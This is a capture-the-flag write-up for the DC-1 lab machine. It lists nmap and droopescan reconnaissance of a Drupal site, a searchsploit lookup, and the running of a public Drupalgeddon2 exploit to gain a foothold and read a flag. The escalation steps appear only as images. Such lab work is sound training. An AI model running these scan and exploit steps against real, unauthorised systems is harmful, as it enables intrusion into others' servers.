# DC-1

My IP address: 192.168.1.23

Machine IP: 192.168.1.27

# Enumeration:

## Nmap:

```bash
nmap 192.168.1.27
```

![Untitled](DC-1%20947d759ecf2e4ba6b1bcf8d87d9cd77c/Untitled.png)

```bash
sudo nmap -sV -sC 192.168.1.27 -oN ./Nmap.init
```

[Nmap.init](DC-1%20947d759ecf2e4ba6b1bcf8d87d9cd77c/Nmap.init)

![Untitled](DC-1%20947d759ecf2e4ba6b1bcf8d87d9cd77c/Untitled%201.png)

```bash
nmap -p- 192.168.1.27 -oN ./Nmap/all_ports.nmap
```

[all_ports.nmap](DC-1%20947d759ecf2e4ba6b1bcf8d87d9cd77c/all_ports.nmap)

![Untitled](DC-1%20947d759ecf2e4ba6b1bcf8d87d9cd77c/Untitled%202.png)

```bash
sudo nmap -sU 192.168.1.27 -oN ./Nmap/UDP-scan.nmap
```

[UDP-scan.nmap](DC-1%20947d759ecf2e4ba6b1bcf8d87d9cd77c/UDP-scan.nmap)

## Drupal Scan:

```bash
droopescan scan drupal -u http://192.168.1.27/
```

![Untitled](DC-1%20947d759ecf2e4ba6b1bcf8d87d9cd77c/Untitled%203.png)

# Manual Enumeration:

We have a Linux Box that hosts a `drupal` website on TCP port 80

![Untitled](DC-1%20947d759ecf2e4ba6b1bcf8d87d9cd77c/Untitled%204.png)

Found `robots.txt`

```
http://192.168.1.27/robots.txt
```

All possible versions are vulnerable to SQLi that can be leveraged to RCE:

```
searchsploit drupal |grep "Remote Code Execution"
```

![Untitled](DC-1%20947d759ecf2e4ba6b1bcf8d87d9cd77c/Untitled%205.png)

After some trial and error I found the following exploit:

```
https://github.com/dreadlocked/Drupalgeddon2
```

# Initial-Foothold:

[drupalgeddon2.rb](DC-1%20947d759ecf2e4ba6b1bcf8d87d9cd77c/drupalgeddon2.rb)

```
ruby drupalgeddon2.rb "http://192.168.1.27/"
```

![Untitled](DC-1%20947d759ecf2e4ba6b1bcf8d87d9cd77c/Untitled%206.png)

![Untitled](DC-1%20947d759ecf2e4ba6b1bcf8d87d9cd77c/Untitled%207.png)

Wut:

```
cat /home/flag4/flag4.txt
```

![Untitled](DC-1%20947d759ecf2e4ba6b1bcf8d87d9cd77c/Untitled%208.png)

# Pivoting:

# Escalation:

![Untitled](DC-1%20947d759ecf2e4ba6b1bcf8d87d9cd77c/Untitled%209.png)

![Untitled](DC-1%20947d759ecf2e4ba6b1bcf8d87d9cd77c/Untitled%2010.png)

![Untitled](DC-1%20947d759ecf2e4ba6b1bcf8d87d9cd77c/Untitled%2011.png)

![Untitled](DC-1%20947d759ecf2e4ba6b1bcf8d87d9cd77c/Untitled%2012.png)